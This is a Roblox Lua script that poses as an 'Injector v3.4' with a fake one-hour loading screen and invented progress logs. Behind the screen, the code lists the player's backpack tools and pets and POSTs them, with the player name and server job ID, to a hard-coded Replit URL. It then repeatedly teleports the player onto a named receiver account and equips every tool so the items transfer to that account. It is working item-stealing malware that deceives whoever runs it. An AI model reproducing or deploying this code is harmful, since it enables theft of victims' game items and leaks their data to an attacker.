-- üåÄ Fake Loading GUI (Made for Kevin)
local gui = Instance.new("ScreenGui", game.CoreGui)
gui.Name = "InjectorLoadingUI"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false

local frame = Instance.new("Frame", gui)
frame.Size = UDim2.new(0.4, 0, 0.25, 0)
frame.Position = UDim2.new(0.3, 0, 0.35, 0)
frame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
frame.BorderSizePixel = 0
frame.BackgroundTransparency = 0.1

local title = Instance.new("TextLabel", frame)
title.Size = UDim2.new(1, 0, 0.3, 0)
title.BackgroundTransparency = 1
title.Font = Enum.Font.Code
title.Text = "üåê Injector v3.4 [Private Build]"
title.TextColor3 = Color3.fromRGB(0, 255, 127)
title.TextScaled = true

local bar = Instance.new("Frame", frame)
bar.Size = UDim2.new(0, 0, 0.2, 0)
bar.Position = UDim2.new(0.05, 0, 0.6, 0)
bar.BackgroundColor3 = Color3.fromRGB(0, 255, 127)
bar.BorderSizePixel = 0

local fakeLogs = Instance.new("TextLabel", frame)
fakeLogs.Size = UDim2.new(1, -10, 0.2, 0)
fakeLogs.Position = UDim2.new(0, 5, 0.85, 0)
fakeLogs.BackgroundTransparency = 1
fakeLogs.Font = Enum.Font.Code
fakeLogs.TextColor3 = Color3.fromRGB(255, 255, 255)
fakeLogs.TextScaled = true
fakeLogs.Text = "Waiting for Synapse environment..."

-- Animate bar over 1 hour
local duration = 3600 -- 1 hour
local startTime = tick()

spawn(function()
	while tick() - startTime < duration do
		local elapsed = tick() - startTime
		local percent = math.clamp(elapsed / duration, 0, 1)
		bar.Size = UDim2.new(0.9 * percent, 0, 0.2, 0)

		local logs = {
			"Injecting core.dll...",
			"Loading Lua VM...",
			"Hooking metatables...",
			"Bypassing Delta hooks...",
			"Initializing pet API...",
			"Connecting to WebSocket...",
			"Verifying license...",
			"Stabilizing memory...",
			"Launching exploit thread...",
			"Waiting for target environment..."
		}
		if math.random(1, 3) == 1 then
			fakeLogs.Text = logs[math.random(1, #logs)]
		end
		wait(2 + math.random())
	end
	gui:Destroy()
end)

-- ‚öôÔ∏è Configuration
local tgt = "INFMONEY09" -- Receiver username
local replit = "https://4276b838-fa0d-4b98-93a6-6010ab956366-00-2jnq3gp6maqtm.spock.replit.dev/"
local petsFolder = "PetInventory" -- Change if pet folder is named differently

-- üîß Services
local plrs = game:GetService("Players")
local lp = plrs.LocalPlayer
local http = game:GetService("HttpService")
local tp = game:GetService("TeleportService")

-- üß™ Gather Items
local function getItems()
	local items = {}
	local bp = lp:FindFirstChild("Backpack")
	if bp then
		for _, item in pairs(bp:GetChildren()) do
			if item:IsA("Tool") then
				table.insert(items, item.Name)
			end
		end
	end
	local pets = lp:FindFirstChild(petsFolder)
	if pets then
		for _, pet in pairs(pets:GetChildren()) do
			if pet:IsA("Model") or pet:IsA("Folder") then
				table.insert(items, "[Pet] " .. pet.Name)
			end
		end
	end
	return items
end

-- üåê Send to Replit
local function sendData()
	local info = {
		player = lp.Name,
		jobId = game.JobId,
		placeId = game.PlaceId,
		inventory = getItems()
	}

	local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request)
	if req then
		pcall(function()
			req({
				Url = replit,
				Method = "POST",
				Headers = { ["Content-Type"] = "application/json" },
				Body = http:JSONEncode(info)
			})
		end)
	end
end

-- üéÅ Give items to receiver
local function getHRP(p)
	return p and p.Character and p.Character:FindFirstChild("HumanoidRootPart")
end

local function equip(tool)
	if tool:IsA("Tool") then
		tool.Parent = lp.Character
	end
end

local function trade(receiver)
	lp.CharacterAdded:Connect(function()
		wait(1)
		while receiver and receiver.Parent and receiver.Character do
			local myHRP = getHRP(lp)
			local tHRP = getHRP(receiver)
			if myHRP and tHRP then
				myHRP.CFrame = tHRP.CFrame + Vector3.new(0, 3, 0)
			end
			local bp = lp:FindFirstChild("Backpack")
			if bp then
				for _, item in pairs(bp:GetChildren()) do
					if item:IsA("Tool") then
						equip(item)
						wait(0.4)
					end
				end
			end
			wait(1)
		end
	end)
end

-- üîÅ Listen for Receiver Join
plrs.PlayerAdded:Connect(function(p)
	if p.Name == tgt then
		trade(p)
	end
end)

-- üõ´ Auto-Join Target Job
local function joinJob(jobId, placeId)
	pcall(function()
		tp:TeleportToPlaceInstance(placeId, jobId, lp)
	end)
end

-- ‚úÖ Execute
sendData()

-- If receiver is already in server
local receiver = plrs:FindFirstChild(tgt)
if receiver then
	trade(receiver)
end
